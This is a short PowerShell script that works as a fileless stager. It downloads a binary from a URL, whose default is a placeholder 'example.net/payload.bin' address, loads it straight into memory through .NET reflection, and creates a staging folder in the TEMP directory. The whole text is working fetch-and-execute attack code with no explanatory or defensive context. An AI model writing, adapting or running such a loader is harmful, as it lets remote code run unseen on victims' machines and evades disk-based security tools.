[CmdletBinding()]
param(
    [string]$PayloadUrl = "http://example.net/payload.bin"
)
$StageBytes = (New-Object System.Net.WebClient).DownloadData($PayloadUrl)
[Reflection.Assembly]::Load($StageBytes)
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
